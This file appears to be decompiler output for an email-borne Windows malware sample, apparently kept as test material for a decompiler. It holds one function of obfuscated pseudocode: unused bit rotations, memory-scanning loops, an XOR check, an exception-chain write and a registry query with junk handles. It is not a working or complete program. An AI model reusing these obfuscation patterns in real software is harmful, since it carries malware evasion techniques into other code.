// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1137/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004011C5(word32 eax, word32 ecx, int32 edx, word32 ebx, word32 ebp, word32 edi, Eq_69 * fs, word32 dwArg00, LPDWORD, LPBYTE, LPDWORD)
{
// def fp
// def ax
// def eax
// def edx
// def dwArg00
// def Mem0
// def tArg04
// def tArg08
// def tArg0C
// def fs
	__rol((word16) (DPB(eax, __rol(ax, 0x08), 0, 16) - 0x00000001), 0x0D);
	dx_20 = (word16) (edx >> 0x00000013);
	if (Mem0[dwArg00 + 0x00000008:byte] != 0x90)
	{
		RegQueryValueExW(0x38CB9157, 0xCDE6846C, dwArg00, tArg04, tArg08, tArg0C);
		return;
	}
	else
	{
		esi_75 = Mem0[DPB(0x0012A360, dx_20, 0, 16):word32];
		edx_83 = globals->dw4010CC;
		do
		{
// esi_90 = PHI(esi_75, esi_92)
			esi_92 = esi_90 - 0xFFFFFFFF;
		} while (~*esi_92 + edx_83 != 0x00000001);
		__ror((word16) dwArg00, 0x05);
		edx_127 = dwArg00;
		ecx_133 = globals->dw40102D;
// edx_140 = PHI(edx_127, edx_144)
		edx_144 = edx_140 + 0x00000001;
		while ((Mem0[edx_140 + 0x00000000:word32] ^ ecx_133) != 0x00000000)
		{
// edx_140 = PHI(edx_127, edx_144)
			edx_144 = edx_140 + 0x00000001;
		}
		fs->dw0000 = fp - 0x0000000C;
		__ror(edx_144 >> 0x00000016, 0x1E);
		__rol(0x0000, 0x0B);
		return;
	}
}

